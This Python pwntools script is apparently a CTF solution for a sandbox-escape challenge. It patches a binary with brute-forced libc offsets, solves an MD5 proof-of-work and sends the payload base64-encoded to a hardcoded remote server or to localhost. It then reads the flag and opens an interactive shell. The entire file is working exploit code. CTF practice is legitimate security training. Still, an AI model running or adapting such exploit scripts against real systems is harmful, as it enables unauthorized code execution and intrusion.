#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
context.log_level = "error"
import hashlib
import base64
import string
from pwnlib.util.iters import bruteforce
def md5(x):
    return hashlib.md5(x).hexdigest()

pool = string.printable.replace("\n","")
#r=process(["python", "./server.py"])
with open("./main","r") as f:
    elf = f.read()

libc = ELF("./libc.so.6")
idx =  elf.find(p64(0x227168+0x5cc000 - libc.sym["free"]))

for offset in range(0x5cc000,0x300000,-0x1000):
    print hex(offset)
    dis = offset + 0x227168 - libc.sym["free"]
    if len(sys.argv) == 2:
        r = remote("39.105.151.182",9999)
        r.recvuntil("key+\"")
        key = r.recv(10)
        r.recvuntil("==")
        ret = r.recv(4)
        data = bruteforce(lambda x: md5(x+key)[:4] == ret,method = "downfrom", length = 5,alphabet= pool)
        r.sendline(data)
    else:
        r = remote("127.0.0.1",1234)
    r.recvuntil("escape the sandbox!")
    payload = elf[:idx]+p64(dis) + elf[idx+8:]
    try:
        r.sendline(base64.b64encode(payload))
        r.recvuntil("[*] Switching to interactive mode\n")
        r.sendline("cat flag")
        data = r.recvline()
        print data
        if "EOF" in data or "stopped" in data:
            r.close()
        else:
            r.sendline("cat flag")
            r.interactive()
            break
    except Exception as e:
        r.close()

